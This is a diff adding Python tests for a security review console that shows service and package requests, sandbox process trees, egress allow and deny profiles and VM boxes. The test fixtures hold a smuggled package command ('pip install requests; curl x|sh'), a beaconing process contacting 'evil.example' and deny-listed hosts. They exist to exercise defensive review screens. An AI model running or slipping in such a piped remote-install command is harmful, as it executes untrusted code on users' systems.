@@ -1326,8 +1326,8 @@ async def test_tui_security_tabs_and_queue_verdicts_after_confirm(cfg):
         assert not any("old" in r for r in rows)            # approved requests are gone
         # tab / → forward, ← back, numbers jump, wraps round
         for key, tab in (("tab", "network"), ("right", "logs"), ("left", "network"),
-                         ("4", "secrets"), ("tab", "queue"), ("left", "secrets"),
-                         ("1", "queue")):
+                         ("4", "secrets"), ("tab", "persistent"), ("6", "profiles"),
+                         ("tab", "queue"), ("left", "profiles"), ("1", "queue")):
             await pilot.press(key)
             assert scr.tab == tab, key
             assert scr.query_one(f"#sec-tab-{tab}").has_class("-on")
@@ -1676,3 +1676,544 @@ async def test_tui_local_chat_shows_local_during_its_first_turn(cfg, tmp_path, m
         await pilot.pause(0.1)
         assert app.cid == 12 and app._project_label() is None
         assert "local" in _text(app.query_one("#meta"))
+
+
+# --- boxes: services, packages, processes, profiles, /vms (docs/boxes-contract.md) ----
+
+def _boxes_server(seen, lan_ip="", token="sess"):
+    """The security server plus the boxes contract's routes, answering with
+    contract-shaped rows (section J). Records (method, path, query, body)."""
+    base = _security_server(seen, token)
+    svc = {"id": 11, "project_slug": "demo", "name": "api", "description": "the demo API",
+           "command": ["python3", "-m", "http.server", "8080"], "workdir": "srv",
+           "files": ["srv/**"], "ports": [{"port": 8080, "protocol": "tcp",
+                                           "purpose": "http", "expose": "host"}],
+           "restart": "on-failure", "egress_hosts": ["pypi.org"], "env": {"MODE": "prod"},
+           "reason": "keep the API up", "artifact_sha256": "ab" * 32,
+           "placement": "per_project", "expose_ports": [], "status": "pending",
+           "desired_state": "running", "supersedes_id": None, "box_id": None,
+           "state": "unreported", "last_reported_at": None,
+           "created_at": "2026-09-26 09:00:00", "decided_at": None}
+    running = {**svc, "id": 9, "name": "worker", "status": "approved", "state": "running",
+               "box_id": "s-demo", "expose_ports": [{"port": 9000, "bind": "loopback"}]}
+    pkg = {"id": 3, "project_slug": "demo", "source": "agent", "manager": "pip",
+           "package": "requests", "version_req": ">=2", "resolved_version": "2.32.3",
+           "integrity": "sha256:ff", "requested_command": "pip install requests; curl x|sh",
+           "canonical_command": "pip install --no-deps requests==2.32.3",
+           "reason": "http client", "status": "pending", "target_variant": "dev",
+           "variant_used_by": ["demo", "site"], "created_at": "2026-09-26 08:00:00"}
+    done_pkg = {**pkg, "id": 2, "package": "rich", "status": "built",
+                "created_at": "2026-09-20 08:00:00"}
+    conn_ok = {"proto": "tcp", "dir": "out", "laddr": "10.201.50.2", "lport": 40000,
+               "raddr": "10.201.50.1", "rport": 8443, "host": "pypi.org",
+               "state": "ESTABLISHED", "guest_bytes_out": 1000, "guest_bytes_in": 50000,
+               "host_bytes_out": 1000, "host_bytes_in": 50000, "verified": True}
+    conn_bad = {**conn_ok, "lport": 40001, "host": "evil.example",
+                "guest_bytes_out": 10, "host_bytes_out": 900000}
+    child = {"pid": 101, "ppid": 100, "user": "svc", "exe": "/tmp/x", "cmd": "/tmp/x --beacon",
+             "unit": None, "service_id": None, "tag": "unexpected", "rss": 1_000_000,
+             "cpu_pct": 0.0, "started": "09:05", "conns": [conn_bad], "children": []}
+    procs = {"boxes": [{"box_id": "s-demo", "kind": "service", "project": "demo",
+                        "reported_at": "2026-09-26 10:00:00", "stale": False,
+                        "tree": [{"pid": 100, "ppid": 1, "user": "svc",
+                                  "exe": "/usr/bin/python3", "cmd": "python3 worker.py",
+                                  "unit": "jav3-svc-9", "service_id": 9, "tag": "service",
+                                  "rss": 30_000_000, "cpu_pct": 2.0, "started": "09:00",
+                                  "conns": [conn_ok], "children": [child]}]}]}
+    profiles = [{"id": 1, "name": "Default", "builtin": 1, "default_verdict": "deny",
+                 "network_off": 0, "allow_hosts": ["pypi.org"], "deny_hosts": ["bad.example"],
+                 "secrets": [], "auto_handle": 1, "separate_box": 0, "box_image": "main",
+                 "box_mem_mb": None, "box_runtime": "kvm", "allow_services": 1,
+                 "allow_package_requests": 1, "service_placement": "per_project",
+                 "projects": ["demo", "site"]},
+                {"id": 2, "name": "Sandboxed", "builtin": 0, "default_verdict": "deny",
+                 "network_off": 0, "allow_hosts": [], "deny_hosts": [], "secrets": ["TBA_KEY"],
+                 "auto_handle": 0, "separate_box": 1, "box_image": "dev", "box_mem_mb": 768,
+                 "box_runtime": "docker", "allow_services": 0, "allow_package_requests": 0,
+                 "service_placement": "per_service", "projects": []}]
+    vm_boxes = {"enabled": True, "boxes": [
+        {"id": "shared", "kind": "shared", "project": None, "cid": 3, "runtime": "kvm",
+         "service_id": None, "placement": None, "state": "running",
+         "image": {"variant": "main", "version": None}, "mem_mb": 768,
+         "rss_bytes": 500_000_000, "cpu_pct": 4.0, "uptime_s": 3700, "inflight": 0,
+         "disk": {"overlay_bytes": 1_000_000, "data_bytes": 0},
+         "net": {"tap": "jvtap0", "host_ip": "10.201.0.1", "guest_ip": "10.201.0.2"}},
+        {"id": "p-site", "kind": "project", "project": "site", "cid": 10,
+         "runtime": "docker", "service_id": None, "placement": None, "state": "stopped",
+         "image": {"variant": "dev", "version": "3"}, "mem_mb": 768, "rss_bytes": 0,
+         "cpu_pct": 0, "uptime_s": 0, "inflight": 0,
+         "disk": {"overlay_bytes": 2_000_000, "data_bytes": 5_000_000},
+         "net": {"tap": "jvbr10", "host_ip": "10.201.10.1", "guest_ip": "10.201.10.2"}}],
+        "budget": {"ram_mb_used": 1536, "ram_mb_cap": 2250, "boxes": 2, "boxes_cap": 4,
+                   "project_boxes": 1, "project_boxes_cap": 1}}
+    images = {"variants": [{"name": "dev", "from": "main", "builtin": True,
+                            "recipe": "apt golang", "recipe_sha256": "cd" * 32,
+                            "min_mem_mb": 768, "used_by": ["site"],
+                            "versions": [{"version": "3", "base_version": "7",
+                                          "size_bytes": 900_000_000,
+                                          "built_at": "2026-09-20", "status": "built",
+                                          "active": True, "in_use_by": ["p-site"]}]}],
+              "build": {"running": False, "variant": None, "phase": None}}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        path, method = request.url.path, request.method
+        mine = (path.startswith(("/api/services", "/api/packages", "/api/vm/",
+                                 "/api/profiles", "/api/egress/policy/"))
+                or path.endswith("/profile"))
+        if not mine:
+            return base.handler(request)
+        if f"jarvis_token={token}" not in request.headers.get("cookie", ""):
+            return httpx.Response(401, json={"detail": "not authenticated"})
+        body = json.loads(request.content) if request.content else None
+        seen.append((method, path, dict(request.url.params), body))
+        if method != "GET":
+            return httpx.Response(200, json={"ok": True})
+        if path == "/api/services":
+            return httpx.Response(200, json={"services": [svc, running],
+                                             "services_lan_ip": lan_ip})
+        if path.startswith("/api/services/"):
+            return httpx.Response(200, json={**svc, "diff": None})
+        if path == "/api/packages":
+            st = request.url.params.get("status")
+            return httpx.Response(200, json={"packages": [p for p in (pkg, done_pkg)
+                                                          if not st or p["status"] == st]})
+        if path == "/api/vm/processes":
+            return httpx.Response(200, json=procs)
+        if path == "/api/vm/boxes":
+            return httpx.Response(200, json=vm_boxes)
+        if path == "/api/vm/images":
+            return httpx.Response(200, json=images)
+        if path == "/api/profiles":
+            return httpx.Response(200, json={"profiles": profiles})
+        if path.startswith("/api/egress/policy/"):
+            slug = path.rsplit("/", 1)[1]
+            if slug == "__general__":
+                return httpx.Response(404, json={"detail": "gone"})
+            return httpx.Response(200, json={
+                "profile": {"id": 1, "name": "Default", "default": "deny"},
+                "project_allow": [f"{slug}.dev"], "project_deny": ["tracker.example"],
+                "effective_allow": [f"{slug}.dev", "pypi.org"],
+                "effective_deny": ["tracker.example", "bad.example"]})
+        return httpx.Response(404, json={"detail": "nope"})
+    return httpx.MockTransport(handler)
+
+
+async def _screen(pilot, app, cmd, name):
+    app.dispatch(cmd)
+    await _until(pilot, lambda: type(app.screen).__name__ == name)
+    return app.screen
+
+
+async def _modal(pilot, app, name):
+    return await _until(pilot, lambda: type(app.screen).__name__ == name)
+
+
+async def test_tui_queue_service_request_needs_placement_and_confirm(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security", "SecurityScreen")
+        assert await _until(pilot, lambda: scr.loaded["queue"]
+                            and any("SVC" in r for r in _rows(scr)))
+        rows = _rows(scr)
+        assert any("SVC" in r and "api" in r and "per_project" in r for r in rows)
+        assert any("PKG" in r and "requests" in r and "dev" in r for r in rows)
+        assert not any("worker" in r for r in rows)          # approved: not in the queue
+        assert "1 service" in _text(scr.query_one("#sec-sub"))
+        scr.select_key("v11")
+        d = _text(scr.query_one("#sec-detail"))
+        assert "abab" in d and "pypi.org" in d and "python3 -m http.server" in d
+        assert "LAN exposure unavailable" in d
+        # y: the review dialog, placement preselected from the profile
+        await pilot.press("y")
+        assert await _modal(pilot, app, "ServiceApprove")
+        dlg = app.screen
+        assert dlg.placement == "per_project" and dlg.options() == ["none", "host"]
+        assert dlg.expose == ["none"]                         # nothing exposed unasked
+        await pilot.press("1")                                # per_service
+        await pilot.press("space")                            # 8080: none -> host
+        await pilot.press("space", "space")                   # host -> none -> host (no lan)
+        assert dlg.placement == "per_service" and dlg.expose == ["host"]
+        await pilot.press("enter")
+        assert await _modal(pilot, app, "Confirm")
+        q, detail = app.screen.question, app.screen.detail
+        assert "per_service" in q and "abab" in detail and "loopback" in detail
+        assert "changed from the profile's per_project" in detail
+        await pilot.press("n")
+        await pilot.pause(0.2)
+        assert not [p for _, p, _ in _posts(seen) if p.startswith("/api/services")]
+        # again, and yes: exactly the contract's request
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("y")
+        assert await _modal(pilot, app, "ServiceApprove")
+        await pilot.press("space", "enter")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: (
+            "POST", "/api/services/11/approve",
+            {"acknowledge": True, "placement": "per_project",
+             "expose_ports": [{"port": 8080, "bind": "loopback"}]}) in _posts(seen))
+
+
+async def test_tui_service_dialog_refuses_without_placement_and_offers_lan(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess",
+                         transport=_boxes_server(seen, lan_ip="192.168.1.60"))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security", "SecurityScreen")
+        assert await _until(pilot, lambda: any("SVC" in r for r in _rows(scr)))
+        scr.select_key("v11")
+        # a row with no placement: enter refuses until one is picked
+        scr.selected()["raw"]["placement"] = None
+        await pilot.press("y")
+        assert await _modal(pilot, app, "ServiceApprove")
+        dlg = app.screen
+        assert dlg.placement is None and dlg.options() == ["none", "host", "lan"]
+        await pilot.press("enter")
+        await pilot.pause(0.1)
+        assert app.screen is dlg and "placement" in dlg.error
+        await pilot.press("3", "space", "space")              # shared, 8080 on the LAN
+        await pilot.press("enter")
+        assert await _modal(pilot, app, "Confirm")
+        assert "192.168.1.60" in app.screen.detail and "shared" in app.screen.question
+        await pilot.press("y")
+        assert await _until(pilot, lambda: (
+            "POST", "/api/services/11/approve",
+            {"acknowledge": True, "placement": "shared",
+             "expose_ports": [{"port": 8080, "bind": "lan"}]}) in _posts(seen))
+
+
+async def test_tui_queue_package_card_approve_and_reject(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security", "SecurityScreen")
+        assert await _until(pilot, lambda: any("PKG" in r for r in _rows(scr)))
+        assert ("GET", "/api/packages", {"status": "pending"}, None) in seen
+        scr.select_key("pk3")
+        d = _text(scr.query_one("#sec-detail"))
+        assert "curl x|sh" in d and "pip install --no-deps requests==2.32.3" in d
+        assert "2.32.3" in d and "http client" in d and "used by: demo, site" in d
+        await pilot.press("y")
+        assert await _modal(pilot, app, "Confirm")
+        assert "Installs into `dev` — used by: demo, site" in app.screen.detail
+        await pilot.press("escape")
+        await pilot.pause(0.2)
+        assert not [p for _, p, _ in _posts(seen) if p.startswith("/api/packages")]
+        await pilot.press("y")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: (
+            "POST", "/api/packages/3/approve",
+            {"acknowledge": True, "target_variant": "dev"}) in _posts(seen))
+        # n: a reason, then a Confirm, then the reject
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("pk3")
+        await pilot.press("n")
+        assert await _modal(pilot, app, "Ask")
+        await pilot.press(*"not needed", "enter")
+        assert await _modal(pilot, app, "Confirm")
+        assert not any(p.endswith("/reject") for _, p, _ in _posts(seen))
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/packages/3/reject",
+                                            {"reason": "not needed"}) in _posts(seen))
+
+
+async def test_tui_network_groups_by_project_with_allow_deny_and_baseline(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security network", "SecurityScreen")
+        assert await _until(pilot, lambda: scr.loaded["network"]
+                            and any("⌂ site" in r for r in _rows(scr)))
+        rows = _rows(scr)
+        demo = next(i for i, r in enumerate(rows) if "⌂ demo" in r)
+        site = next(i for i, r in enumerate(rows) if "⌂ site" in r)
+        assert "Default" in rows[demo] and "allow 1" in rows[demo] and "deny 1" in rows[demo]
+        # each project's traffic sits under its own header
+        assert "pypi.org" in rows[demo + 1] and "evil.example" in rows[site + 1]
+        assert not scr.errors["network"]                      # no general row: quiet
+        scr.select_key("Pdemo")
+        d = _text(scr.query_one("#sec-detail"))
+        assert "demo.dev" in d and "tracker.example" in d
+        assert "profile baseline allow: pypi.org" in d and "bad.example" in d
+        await pilot.press("e")
+        assert await _modal(pilot, app, "Ask")
+        assert app.screen.value == "demo.dev"
+        await pilot.press("end", *", x.org", "enter")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask"
+                            and "DENY" in app.screen.question)
+        await pilot.press("enter")
+        assert await _modal(pilot, app, "Confirm")
+        assert not any(m == "PUT" for m, _, _ in _posts(seen))
+        await pilot.press("y")
+        assert await _until(pilot, lambda: (
+            "PUT", "/api/egress/policy/demo",
+            {"allow": ["demo.dev", "x.org"], "deny": ["tracker.example"]}) in _posts(seen))
+
+
+async def test_tui_persistent_tree_mismatch_stop_and_revoke(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security persistent", "SecurityScreen")
+        assert await _until(pilot, lambda: scr.loaded["persistent"]
+                            and any("s-demo" in r for r in _rows(scr)))
+        rows = _rows(scr)
+        assert any("▸" in r and "python3 worker.py" in r and "! below" in r for r in rows)
+        assert not any("--beacon" in r for r in rows)         # folded until enter
+        assert any("worker" in r and "per_project" in r for r in rows)  # service list
+        assert "need a look" in _text(scr.query_one("#sec-sub"))
+        scr.select_key("Ns-demo:100")
+        await pilot.press("enter")
+        assert await _until(pilot, lambda: any("--beacon" in r for r in _rows(scr)))
+        child = next(r for r in _rows(scr) if "--beacon" in r)
+        assert "UNEXPECTED" in child and "bytes mismatch" in child
+        assert child.startswith("  ")                         # indented under its parent
+        await pilot.press("down")
+        assert scr.sel["persistent"] == "Ns-demo:101"
+        d = _text(scr.query_one("#sec-detail"))
+        assert "MISMATCH" in d and "guest ↑10 " in d and "host ↑900.0k" in d
+        assert "not a service" in d
+        await pilot.press("s")                                # not a service: nothing
+        await pilot.pause(0.2)
+        assert app.screen is scr
+        # the service process: s stops, d revokes, each after a Confirm
+        await pilot.press("up")
+        assert "verified" in _text(scr.query_one("#sec-detail"))
+        await pilot.press("s")
+        assert await _modal(pilot, app, "Confirm")
+        assert "worker" in app.screen.question
+        await pilot.press("n")
+        await pilot.pause(0.2)
+        assert not [p for _, p, _ in _posts(seen) if p.startswith("/api/services")]
+        await pilot.press("s")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/services/9/stop", None)
+                            in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("S9")
+        await pilot.press("d")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm"
+                            and "/srv" in app.screen.question)
+        await pilot.press("n")                                # keep the data
+        assert await _until(pilot, lambda: ("POST", "/api/services/9/revoke",
+                                            {"confirm": True, "delete_data": False})
+                            in _posts(seen))
+
+
+async def test_tui_profiles_form_refuses_without_explicit_runtime_and_placement(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security profiles", "SecurityScreen")
+        assert await _until(pilot, lambda: scr.loaded["profiles"] and len(_rows(scr)) == 2)
+        rows = _rows(scr)
+        assert "Default" in rows[0] and "builtin" in rows[0] and "per_project" in rows[0]
+        assert "docker" in rows[1] and "less isolated" in rows[1]
+        await pilot.press("down")
+        d = _text(scr.query_one("#sec-detail"))
+        assert "TBA_KEY" in d and "per_service" in d and "separate box: yes" in d
+        # a new profile: saving without runtime and placement is refused
+        await pilot.press("a")
+        assert await _modal(pilot, app, "ProfileForm")
+        form = app.screen
+        assert form.v["box_runtime"] is None and form.v["service_placement"] is None
+        await pilot.press("enter")                            # name
+        assert await _modal(pilot, app, "Ask")
+        await pilot.press(*"Lab", "enter")
+        assert await _until(pilot, lambda: app.screen is form and form.v["name"] == "Lab")
+        await pilot.press("ctrl+s")
+        await pilot.pause(0.1)
+        assert app.screen is form and "no default" in form.error.lower()
+        assert "runtime" in form.error and "placement" in form.error
+        # the Save row refuses too (the plain-key route)
+        for _ in range(len(form.FIELDS)):
+            await pilot.press("down")
+        await pilot.press("enter")
+        await pilot.pause(0.1)
+        assert app.screen is form
+        assert not [p for m, p, _ in _posts(seen) if p.startswith("/api/profiles")]
+        # pick the runtime (kvm), then the placement (per_service)
+        form.cur = 1
+        await pilot.press("enter")
+        assert await _modal(pilot, app, "Picker")
+        await pilot.press("enter")                            # first row: kvm
+        assert await _until(pilot, lambda: app.screen is form and form.v["box_runtime"])
+        await pilot.press("ctrl+s")
+        await pilot.pause(0.1)
+        assert app.screen is form and "placement" in form.error
+        await pilot.press("down", "enter")
+        assert await _modal(pilot, app, "Picker")
+        await pilot.press("enter")                            # per_service
+        assert await _until(pilot, lambda: app.screen is form
+                            and form.v["service_placement"] == "per_service")
+        form.cur = 7                                          # secrets: names only
+        await pilot.press("enter")
+        assert await _modal(pilot, app, "Ask")
+        await pilot.press(*"tba_key", "enter")
+        assert await _until(pilot, lambda: app.screen is form)
+        await pilot.press("ctrl+s")
+        assert await _until(pilot, lambda: any(m == "POST" and p == "/api/profiles"
+                                               for m, p, _ in _posts(seen)))
+        body = next(b for m, p, b in _posts(seen) if p == "/api/profiles")
+        assert body["box_runtime"] == "kvm" and body["service_placement"] == "per_service"
+        assert body["name"] == "Lab" and body["secrets"] == ["TBA_KEY"]
+        assert body["default_verdict"] == "deny"
+        # p: assign the selected profile to a project, after a Confirm
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("R2")
+        await pilot.press("p")
+        assert await _modal(pilot, app, "Picker")
+        await pilot.press("enter")                            # demo
+        assert await _modal(pilot, app, "Confirm")
+        assert "less isolated" in app.screen.detail
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("PUT", "/api/projects/demo/profile",
+                                            {"profile_id": 2}) in _posts(seen))
+        # builtins cannot be deleted; others after a Confirm
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("R1")
+        await pilot.press("d")
+        await pilot.pause(0.2)
+        assert app.screen is scr and "builtin" in _text(scr.query_one("#sec-sub"))
+        scr.select_key("R2")
+        await pilot.press("d")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("DELETE", "/api/profiles/2", None)
+                            in _posts(seen))
+
+
+async def test_tui_profile_edit_keeps_explicit_values(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security profiles", "SecurityScreen")
+        assert await _until(pilot, lambda: len(_rows(scr)) == 2 and scr.loaded["profiles"])
+        await pilot.press("e")                                # Default
+        assert await _modal(pilot, app, "ProfileForm")
+        assert app.screen.v["box_runtime"] == "kvm"
+        assert app.screen.v["service_placement"] == "per_project"
+        await pilot.press("ctrl+s")
+        assert await _until(pilot, lambda: any(m == "PUT" and p == "/api/profiles/1"
+                                               for m, p, _ in _posts(seen)))
+
+
+async def test_tui_vms_boxes_images_catalogue(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        await pilot.press("ctrl+x", "c")                      # the leader letter
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "VmsScreen")
+        scr = app.screen
+        assert await _until(pilot, lambda: scr.loaded["boxes"] and len(_rows(scr)) == 2)
+        rows = _rows(scr)
+        assert "shared" in rows[0] and "running" in rows[0] and "cpu 4%" in rows[0]
+        assert "p-site" in rows[1] and "less isolated" in rows[1] and "stopped" in rows[1]
+        assert "1536/2250" in _text(scr.query_one("#sec-sub"))
+        assert await _until(pilot, lambda: "Catalogue 1" in _text(
+            scr.query_one("#sec-tab-catalogue")))
+        # s on the running shared box: stop, after a Confirm
+        await pilot.press("s")
+        assert await _modal(pilot, app, "Confirm")
+        assert "Stop box shared" in app.screen.question
+        await pilot.press("n")
+        await pilot.pause(0.2)
+        assert not [p for _, p, _ in _posts(seen) if p.startswith("/api/vm/")]
+        await pilot.press("s")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/vm/boxes/shared/stop", None)
+                            in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("Xp-site")                             # p-site: start, destroy
+        await pilot.press("s")
+        assert await _modal(pilot, app, "Confirm")
+        assert "Start box p-site" in app.screen.question
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/vm/boxes/p-site/start", None)
+                            in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("Xp-site")
+        await pilot.press("d")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm"
+                            and "data disk" in app.screen.question)
+        await pilot.press("n")
+        assert await _until(pilot, lambda: ("POST", "/api/vm/boxes/p-site/destroy",
+                                            {"confirm": True, "delete_data": False})
+                            in _posts(seen))
+        # images: variants with their versions and who uses them; b builds
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("2")
+        assert await _until(pilot, lambda: scr.loaded["images"] and len(_rows(scr)) == 2)
+        rows = _rows(scr)
+        assert "dev" in rows[0] and "site" in rows[0]
+        assert "v3" in rows[1] and "active" in rows[1] and "p-site" in rows[1]
+        await pilot.press("b")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/vm/images/dev/build",
+                                            {"confirm": True}) in _posts(seen))
+        # catalogue: every request, pending first; y approves after a Confirm
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("3")
+        assert await _until(pilot, lambda: scr.loaded["catalogue"] and len(_rows(scr)) == 2)
+        assert "requests" in _rows(scr)[0] and "rich" in _rows(scr)[1]
+        await pilot.press("down", "y")                        # built: nothing to approve
+        await pilot.pause(0.2)
+        assert app.screen is scr
+        await pilot.press("up", "y")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: (
+            "POST", "/api/packages/3/approve",
+            {"acknowledge": True, "target_variant": "dev"}) in _posts(seen))
+        assert await _until(pilot, lambda: app.screen is scr)
+        await pilot.press("escape")
+        assert await _until(pilot, lambda: type(app.screen).__name__ != "VmsScreen")
+
+
+async def test_tui_boxes_surfaces_locked_for_a_chat_only_login(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "jvd_x", transport=_boxes_server(seen))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security", "SecurityScreen")
+        for key in ("5", "enter", "s", "d", "6", "a", "e", "p", "y"):
+            await pilot.press(key)
+        await pilot.pause(0.3)
+        assert type(app.screen).__name__ == "SecurityScreen"
+        assert "needs full access" in _text(scr.query_one("#sec-sub"))
+        await pilot.press("escape")
+        scr = await _screen(pilot, app, "/vms", "VmsScreen")
+        for key in ("s", "d", "2", "b", "3", "y", "n"):
+            await pilot.press(key)
+        await pilot.pause(0.3)
+        assert type(app.screen).__name__ == "VmsScreen"
+        assert "needs full access" in " ".join(_rows(scr))
+        guarded = ("/api/services", "/api/packages", "/api/vm", "/api/profiles",
+                   "/api/egress", "/api/projects", "/api/security", "/api/secrets")
+        assert not [p for _, p, _, _ in seen if p.startswith(guarded)]
